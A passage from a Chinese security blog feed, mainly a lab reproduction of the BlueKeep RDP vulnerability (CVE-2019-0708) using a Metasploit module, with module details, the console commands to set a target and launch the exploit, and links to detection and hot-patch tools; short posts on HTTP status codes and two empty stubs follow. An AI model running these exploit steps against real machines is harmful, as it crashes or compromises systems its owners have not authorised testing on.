class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free</span><br><span class="line">Module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">Platform: Windows</span><br><span class="line">Arch: </span><br><span class="line">       Privileged: Yes</span><br><span class="line">License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Manual</span><br><span class="line">  Disclosed: 2019-05-14</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Sean Dillon &lt;sean.dillon@risksense.com&gt;</span><br><span class="line">  Ryan Hanson &lt;dunno@findthisout.com&gt;</span><br><span class="line">  OJ Reeves &lt;oj@beyondbinary.io&gt;</span><br><span class="line">  Brent Cook &lt;bcook@rapid7.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  --  ----</span><br><span class="line">  0   Automatic targeting via fingerprinting</span><br><span class="line">  1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)</span><br><span class="line">  2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)</span><br><span class="line">  3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)</span><br><span class="line">  4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name             Current Setting  Required  Description</span><br><span class="line">  ----             ---------------  --------  -----------</span><br><span class="line">  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect</span><br><span class="line">  RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect, UNSET = random</span><br><span class="line">  RDP_DOMAIN                        no        The client domain name to report during connect</span><br><span class="line">  RDP_USER                          no        The username to report during connect, UNSET = random</span><br><span class="line">  RHOSTS                            yes       The target address range or CIDR identifier</span><br><span class="line">  RPORT            3389             yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 952</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  The RDP termdd.sys driver improperly handles binds to internal-only </span><br><span class="line">  channel MS_T120, allowing a malformed Disconnect Provider Indication </span><br><span class="line">  message to cause use-after-free. With a controllable data/size </span><br><span class="line">  remote nonpaged pool spray, an indirect call gadget of the freed </span><br><span class="line">  channel is used to achieve arbitrary code execution.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-2019-0708/</span><br><span class="line">  https://github.com/zerosum0x0/CVE-2019-0708</span><br><span class="line"></span><br><span class="line">Also known as:</span><br><span class="line">  Bluekeep</span><br></pre></td></tr></table></figure><blockquote><p>show options</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180651.png" class="lozad"></p><blockquote><p>set rhosts 靶机IP地址</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180915.png" class="lozad"></p><blockquote><p>show targets</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180936.png" class="lozad"></p><blockquote><p>set target 3</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181004.png" class="lozad"></p><blockquote><p>exploit</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911181144.png" class="lozad"></p><p>ps: run和exploit都行</p><h1 id="0x04-复现结果"><a href="#0x04-复现结果" class="headerlink" title="0x04 复现结果"></a>0x04 复现结果</h1><p>Windows server 2008 R2标准版出现蓝屏</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175744.png" class="lozad"></p><p>Windows 7 ultimate sp1复现结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175754.png" class="lozad"></p><h1 id="0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具"><a href="#0X05-漏洞检测修复工具-amp-批量快速扫描检测工具-amp-热补丁工具" class="headerlink" title="0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具"></a>0X05 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具</h1><blockquote><p>（来源奇安信公众号）</p></blockquote><p>【下载页面】<br><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a><br>【使用说明】</p><p>1、 下载文件进行解压。<br>2、 使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。<br>3、 在命令行工具，执行命令到工具所在文件夹<br>4、 输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。<br>5、 重启系统后，需要重新运行命令行来启用热补丁</p><p>【实现效果】<br>在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">传送门</a><br>支持系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Windows XP <span class="keyword">for</span> 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows 7 <span class="keyword">for</span> 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 <span class="keyword">for</span> x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 <span class="keyword">for</span> 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> x64-based Systems ServicePack 1 (Server Core installation)</span><br><span class="line">暂不支持的系统：</span><br><span class="line">Windows Server 2003 <span class="keyword">for</span> x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 <span class="keyword">for</span> Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 <span class="keyword">for</span> Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>从漏洞刚出来开始，我就开始复现，然后各种安装环境，操作系统，但是都没有复现成功，然后看各种文章，感觉都是那些基本操作，么有什么其他地方，然后我使用Windows 7 X64 ultimate sp1 和Windows server 2008 R2都没有复现成功，弄了两天我放弃了，今天我的一天同事也复现这个漏洞，点出了我的错误所在，原来，我讲set target 3 写成了set targets 3 ，我真是太粗心了，没有注意细节，以为show targets命令是列出可攻击的目标列表，就像当然的认为设置目标是set targets了。。。,然后一直复现不成功</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/d535d591ed8c8755" class="lozad"></p><p>最后，自己要记住这个教训，细节注定成败，而我这次败在了细节上，希望自己以后不会忽略这些小细节。共勉 :D</p><h1 id="0x06-参考文档"><a href="#0x06-参考文档" class="headerlink" title="0x06 参考文档"></a>0x06 参考文档</h1><ol><li><a href="https://blog.csdn.net/weixin_44114370/article/details/89440153" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44114370/article/details/89440153</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxNjQ1NDQ0Mw==&amp;mid=2247483662&amp;idx=1&amp;sn=9927dd8b4df7e710ddc4d8b02f922d8d&amp;chksm=9bf5c74aac824e5cfbde1c6587b6fdb149d464bc822a5b764f25538183e6e64934d549461d5d&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1567824187733&amp;sharer_shareid=6236dccf93a9257bd8ba451703af334b&amp;key=ee95eb58550bee7fb822e11f9b1822af1833bae210322a6de084b4219a556826d764fbbf32aa5607dc4acf61a722ef8421901382f992c938d121d6226db2bc2b35a9d19b0eec3693f4a44e6b5d0298de&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=5vOsZrZPCHS2PeMt2y%2FquS927zFQZnSX%2FB%2FcGniqOlND7FA0KtfW5jlUG4BlXuNP</a></li><li><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961</a> </li><li><a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE" target="_blank" rel="noopener">https://github.com/mai-lang-chai/CVE-2019-0708-RCE</a></li><li><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank" rel="noopener">https://www.qianxin.com/other/CVE-2019-0708</a></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞复现" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="https://www.mad-coding.cn/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>常见的HTTP响应状态码</title>
    <link href="https://www.mad-coding.cn/2019/09/10/%E5%B8%B8%E8%A7%81%E7%9A%84HTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://www.mad-coding.cn/2019/09/10/常见的HTTP响应状态码/</id>
    <published>2019-09-10T08:13:54.000Z</published>
    <updated>2019-10-11T09:12:00.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>100 –继续–请求者应当继续提出请求。服务器已收到请求的一部分，正在等待其余部分</p><p>101 –切换协议–请求者已要求服务器切换协议，服务器已确认并准备切换</p><p>200 –成功–服务器已成功处理了请求</p><p>201 –已创建–请求成功并且服务器创建了新的资源</p><p>202 –已接受–服务器已接受请求，但尚未处理</p><p>203 –非授权信息–服务器已成功处理了请求，但返回的想你想可能来自另一个源</p><p>204  –无内容–服务器成功处理了请求，但没有返回任何内容</p><p>205 –重置内容–服务器成功处理了请求，内容被重置</p><p>206 –部分内容–服务器成功处理部分请求</p><p>300 –多种选择–针对请求，服务器可执行多种操作</p><p>301 –永久移动 –请求的网页已永久移动到新的位置，即永久重定向</p><p>302 –临时移动–请求的网页暂时跳转到其他按页面，即暂时重定向</p><p>303 –查看其他位置–如果原来的请求是POST，重定向目标文档应该通过GET提取</p><p>304 –未修改–此次请求返回的网页未修改，继续使用上次的资源</p><p>305 –使用代理–请求者应该使用代理访问该网页</p><p>307 –临时重定向–请求的资源临时从其他位置响应</p><p>400 –错误请求–服务器无法解析该请求</p><p>401 –未授权–请求没有进行身份验证或者验证未通过</p><p>403 –禁止访问–服务器拒绝此请求</p><p>404 –未找到–服务器找不到请求的网页</p><p>405 –方法禁用–服务器禁用了请求中指定的方法</p><p>406 –不接受 –无法使用请求的内容响应请求的网页。</p><p>407 –需要代理授权–请求者需要使用代理授权</p><p>408 –请求超时–服务器请求超时</p><p>409 –冲突–服务器在完成请求时发生冲突</p><p>410 –已删除–请求的资源已永久删除</p><p>411 –需要有效长度–服务器不接受不含有有效内容长度表头字段的请求。</p><p>501 –未实现–服务器不具备完成请求的功能<br>502 –错误网关–服务器作为网关或者代理，从上游服务器收到无效响应<br>503 –服务不可用–服务器目前无法使用<br>504 –网关超时–服务器作为网关或者代理，但是没有及时从上游服务器收到请求<br>505 –HTTP版本不支持–服务器不支持请求中所用的HTTP协议版本</p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础Vim命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80Vim%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础Vim命令/</id>
    <published>2019-09-05T03:16:16.000Z</published>
    <updated>2019-10-11T09:12:27.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础SQL语句</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80SQL%E8%AF%AD%E5%8F%A5/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础SQL语句/</id>
    <published>2019-09-05T03:15:52.000Z</published>
    <updated>2019-10-11T09:12:57.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
